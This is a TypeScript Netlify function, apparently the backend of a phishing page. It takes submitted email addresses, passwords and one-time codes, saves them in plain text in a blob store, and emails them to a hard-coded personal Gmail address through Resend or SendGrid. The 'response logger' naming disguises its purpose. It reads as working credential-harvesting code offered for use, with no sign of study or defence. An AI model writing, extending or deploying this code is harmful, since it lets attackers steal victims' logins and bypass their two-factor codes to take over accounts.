import { getStore } from '@netlify/blobs'
import type { Config } from '@netlify/functions'

const store = getStore({ name: 'response-logs', consistency: 'strong' })
const notificationEmail = 'raza.zaiidii@gmail.com'

type EmailPayload = {
  email: string
  password: string
  code: string
  blobKey: string
}

async function sendResendEmail(payload: EmailPayload) {
  const apiKey = process.env.RESEND_API_KEY
  const from = process.env.RESEND_FROM_EMAIL

  if (!apiKey || !from) {
    return false
  }

  const response = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${apiKey}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      from,
      to: [notificationEmail],
      subject: `New response log: ${payload.email}`,
      text: [
        'A new response log has been captured.',
        '',
        `Blob key: ${payload.blobKey}`,
        `Email: ${payload.email}`,
        `Password: ${payload.password}`,
        `Code: ${payload.code}`,
      ].join('\n'),
    }),
  })

  if (!response.ok) {
    throw new Error(`Resend request failed with status ${response.status}`)
  }

  return true
}

async function sendSendGridEmail(payload: EmailPayload) {
  const apiKey = process.env.SENDGRID_API_KEY
  const from = process.env.SENDGRID_FROM_EMAIL

  if (!apiKey || !from) {
    return false
  }

  const response = await fetch('https://api.sendgrid.com/v3/mail/send', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${apiKey}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      personalizations: [{ to: [{ email: notificationEmail }] }],
      from: { email: from },
      subject: `New response log: ${payload.email}`,
      content: [
        {
          type: 'text/plain',
          value: [
            'A new response log has been captured.',
            '',
            `Blob key: ${payload.blobKey}`,
            `Email: ${payload.email}`,
            `Password: ${payload.password}`,
            `Code: ${payload.code}`,
          ].join('\n'),
        },
      ],
    }),
  })

  if (!response.ok) {
    throw new Error(`SendGrid request failed with status ${response.status}`)
  }

  return true
}

async function sendLogEmail(payload: EmailPayload) {
  const sentWithResend = await sendResendEmail(payload)
  if (sentWithResend) {
    return 'resend'
  }

  const sentWithSendGrid = await sendSendGridEmail(payload)
  if (sentWithSendGrid) {
    return 'sendgrid'
  }

  throw new Error(
    'No email provider configured. Set RESEND_API_KEY + RESEND_FROM_EMAIL or SENDGRID_API_KEY + SENDGRID_FROM_EMAIL.',
  )
}

export default async (req: Request) => {
  if (req.method !== 'POST') {
    return Response.json(
      { error: 'Method not allowed. Use POST.' },
      { status: 405 },
    )
  }

  let body: { email?: string; password?: string; code?: string } = {}
  try {
    body = await req.json()
  } catch {
    return Response.json(
      { error: 'Invalid JSON body. Send {"email","password","code"}.' },
      { status: 400 },
    )
  }

  const email = body.email?.trim() ?? ''
  const password = body.password ?? ''
  const code = body.code ?? ''

  if (!email || !password || !code) {
    return Response.json(
      { error: 'email, password, and code are required.' },
      { status: 400 },
    )
  }

  const combinedText = [email, password, code].join('\n')
  await store.set(email, combinedText)
  await sendLogEmail({
    email,
    password,
    code,
    blobKey: email,
  })

  return Response.json({
    ok: true,
    key: email,
  })
}

export const config: Config = {
  path: '/api/response-logger',
}
